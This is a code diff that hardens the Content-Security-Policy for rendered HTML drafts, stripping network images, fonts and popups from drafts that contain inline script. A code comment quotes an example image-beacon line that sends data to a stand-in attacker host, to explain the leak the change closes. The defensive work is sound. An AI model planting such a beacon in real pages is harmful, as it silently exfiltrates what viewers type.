@@ -457,7 +457,12 @@ async function renderDraft(req, res, { draftId, versionNumber }) {
   }
 
   const html = await getHtmlObject(version.object_key);
-  res.setHeader("Content-Security-Policy", draftContentSecurityPolicy());
+  // Rows from before content signals existed have has_inline_script = null;
+  // treat unknown as scripted so they get the stricter policy.
+  res.setHeader(
+    "Content-Security-Policy",
+    draftContentSecurityPolicy({ scripted: version.has_inline_script !== false })
+  );
   // Drafts are reachable only by unguessable ID; keep crawlers from turning a
   // shared link into a search result.
   res.setHeader("X-Robots-Tag", "noindex, nofollow");
@@ -478,14 +483,26 @@ async function renderDraft(req, res, { draftId, versionNumber }) {
 // fetch/XHR are dead, and it cannot touch cookies or any myhtmls origin.
 // Everything else the upload policy already strips (external scripts, forms,
 // frames, handlers) stays blocked here as defense in depth.
-function draftContentSecurityPolicy() {
+//
+// The policy is per-version: a draft whose stored version contains inline
+// script loses network images and fonts (data: only) and silent popups.
+// Otherwise a script could bypass connect-src 'none' with an image beacon —
+// new Image().src = "https://attacker/?d=..." — and exfiltrate whatever a
+// viewer typed into the page. Script-free drafts keep https images; scripts
+// and arbitrary-host images are never available together. The remaining
+// escape for scripted drafts is a full-page navigation on user click, which
+// is visible to the viewer rather than silent.
+function draftContentSecurityPolicy({ scripted }) {
+  const sandbox = scripted
+    ? "sandbox allow-scripts allow-top-navigation-by-user-activation"
+    : "sandbox allow-popups allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation";
   return [
-    "sandbox allow-scripts allow-popups allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation",
+    sandbox,
     "default-src 'none'",
     "script-src 'unsafe-inline'",
     "style-src 'unsafe-inline'",
-    "img-src https: data:",
-    "font-src https: data:",
+    scripted ? "img-src data:" : "img-src https: data:",
+    scripted ? "font-src data:" : "font-src https: data:",
     "connect-src 'none'",
     "frame-src 'none'",
     "worker-src 'none'",
